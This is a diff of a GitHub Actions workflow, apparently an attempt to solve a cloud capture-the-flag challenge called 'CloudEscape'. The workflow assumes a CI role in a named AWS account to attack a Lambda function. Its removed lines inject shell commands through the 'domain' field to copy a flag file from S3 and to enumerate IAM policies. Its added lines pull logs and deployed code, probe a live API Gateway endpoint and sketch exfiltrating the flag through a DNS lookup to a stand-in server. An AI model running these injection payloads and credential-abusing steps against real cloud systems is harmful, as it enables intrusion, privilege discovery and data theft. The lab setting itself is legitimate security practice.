@@ -1,4 +1,4 @@
-name: CloudEscape Stage 1 - Invoke
+name: CloudEscape Stage 1 - Flag
 on:
   workflow_dispatch:
   push:
@@ -18,67 +18,82 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      # ── 1. Get Lambda resource policy — who can invoke? ──
-      - name: Get Lambda Policy
+      # ── 1. Read CloudWatch logs from the Lambda ──
+      - name: Get CloudWatch Log Events
         run: |
-          echo "===== Lambda Resource Policy ====="
-          aws lambda get-policy --function-name nslookupv2 --region us-east-1 2>&1 || echo "No policy / access denied"
+          echo "===== Describe log groups ====="
+          aws logs describe-log-groups --region us-east-1 2>&1 || true
 
-      # ── 2. Try invoking the Lambda with command injection ──
-      - name: Invoke Lambda - Command Injection
+          echo "===== Get log events for /aws/lambda/nslookupv2 ====="
+          # Try to get recent log events
+          aws logs get-log-events \
+            --log-group-name /aws/lambda/nslookupv2 \
+            --log-stream-name $(aws logs describe-log-streams \
+              --log-group-name /aws/lambda/nslookupv2 \
+              --order-by LastEventTime \
+              --descending \
+              --limit 1 \
+              --query 'logStreams[0].logStreamName' \
+              --output text 2>/dev/null) \
+            --limit 50 --region us-east-1 2>&1 || true
+
+          echo "===== Filter log events for flag ====="
+          aws logs filter-log-events \
+            --log-group-name /aws/lambda/nslookupv2 \
+            --filter-pattern "flag" \
+            --limit 20 --region us-east-1 2>&1 || true
+
+          echo "===== Filter log events for Command output ====="
+          aws logs filter-log-events \
+            --log-group-name /aws/lambda/nslookupv2 \
+            --filter-pattern "Command output" \
+            --limit 20 --region us-east-1 2>&1 || true
+
+      # ── 2. Also try reading code from the Lambda download - check actual deployed code ──
+      - name: Download and inspect Lambda code
         run: |
-          echo "===== Attempt 1: List S3 buckets via injection ====="
-          aws lambda invoke \
-            --function-name nslookupv2 \
-            --region us-east-1 \
-            --payload '{"domain": "x; aws s3 ls"}' \
-            /tmp/response1.json 2>&1 || echo "Invoke failed"
+          aws lambda get-function --function-name nslookupv2 --region us-east-1 \
+            --query 'Code.Location' --output text | xargs curl -o /tmp/nslookupv2.zip
+          mkdir -p /tmp/lambda_code && cd /tmp/lambda_code && unzip -o /tmp/nslookupv2.zip
+          echo "===== Deployed Lambda code ====="
+          cat /tmp/lambda_code/lambda_function.py
 
-          echo "===== Response 1 ====="
-          cat /tmp/response1.json 2>/dev/null || true
+      # ── 3. Try API Gateway GET ──
+      - name: Check API Gateway resources
+        run: |
+          # We know API ID is 3q931syi7b - try to get resources
+          aws apigateway get-resources --rest-api-id 3q931syi7b --region us-east-1 2>&1 || true
+          # Try to get stages
+          aws apigateway get-stage --rest-api-id 3q931syi7b --stage-name dev --region us-east-1 2>&1 || true
+          # Get the API Gateway info
+          aws apigateway get-rest-api --rest-api-id 3q931syi7b --region us-east-1 2>&1 || true
+
+      # ── 4. Exfiltrate flag via DNS - use a unique subdomain to confirm RCE ──
+      - name: Invoke Lambda via API Gateway with exfiltration
+        run: |
+          # Use a webhook catcher or unique identifier
+          # First - let's see if the Lambda returns our input in the response at all
+          echo "===== Test: Unique string detection ====="
+          curl -s -X POST "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup" \
+            -H "Content-Type: application/json" \
+            -d '{"domain": "UNIQUETEST12345.example.com"}' 2>&1
 
           echo ""
-          echo "===== Attempt 2: Read flag.txt via injection ====="
-          aws lambda invoke \
-            --function-name nslookupv2 \
-            --region us-east-1 \
-            --payload '{"domain": "x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt && cat /tmp/flag.txt"}' \
-            /tmp/response2.json 2>&1 || echo "Invoke failed"
+          echo "===== Test: Try to read flag and encode in response via subdomain ====="
+          # The Lambda code does: run_command('/opt/nslookup ' + domain)
+          # With shell=True, we can inject. But output goes to logs.
+          # Let's try: nslookup $(cat /tmp/flag.txt).ourserver.com
+          # But we don't have a DNS server. Let's try to get the output in the response.
+          # The API Gateway response comes from the Lambda return value.
+          # The deployed Lambda returns {body: {ip_address, domain, timestamp}}
+          # Maybe the "domain" field in response reflects our input?
+          echo "===== Check if domain field reflects input ====="
+          curl -s -X POST "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup" \
+            -H "Content-Type: application/json" \
+            -d '{"domain": "flagtest123.com"}'  2>&1
 
-          echo "===== Response 2 ====="
-          cat /tmp/response2.json 2>/dev/null || true
-
-          echo ""
-          echo "===== Attempt 3: Get caller identity via injection ====="
-          aws lambda invoke \
-            --function-name nslookupv2 \
-            --region us-east-1 \
-            --payload '{"domain": "x; aws sts get-caller-identity"}' \
-            /tmp/response3.json 2>&1 || echo "Invoke failed"
-
-          echo "===== Response 3 ====="
-          cat /tmp/response3.json 2>/dev/null || true
-
-      # ── 3. Also try direct S3 get (maybe cicdRole has it somewhere) ──
-      - name: Try Direct S3 Access
-        run: |
-          echo "===== Direct S3 GetObject on flag.txt ====="
-          aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag_direct.txt --region us-east-1 2>&1 || echo "Direct access denied"
-          cat /tmp/flag_direct.txt 2>/dev/null || true
-
-      # ── 4. Check what IAM permissions we actually have ──
-      - name: Check IAM roles and policies
-        run: |
-          echo "===== Get role info ====="
-          aws iam get-role --role-name cicdRole --region us-east-1 2>&1 || true
-          echo "===== List attached policies ====="
-          aws iam list-attached-role-policies --role-name cicdRole --region us-east-1 2>&1 || true
-          echo "===== List inline policies ====="
-          aws iam list-role-policies --role-name cicdRole --region us-east-1 2>&1 || true
-          echo "===== Get role policy documents ====="
-          for policy in $(aws iam list-attached-role-policies --role-name cicdRole --query 'AttachedPolicies[].PolicyName' --output text 2>/dev/null); do
-            echo "--- Policy: $policy ---"
-            aws iam get-policy --policy-arn $(aws iam list-attached-role-policies --role-name cicdRole --query "AttachedPolicies[?PolicyName=='$policy'].PolicyArn" --output text 2>/dev/null) 2>&1 || true
-          done
-          echo "===== lambdaRole info ====="
-          aws iam get-role --role-name lambdaRole --region us-east-1 2>&1 || true
+      # ── 5. Upload Lambda code as artifact ──
+      - uses: actions/upload-artifact@v4
+        with:
+          name: lambda-code
+          path: /tmp/lambda_code/
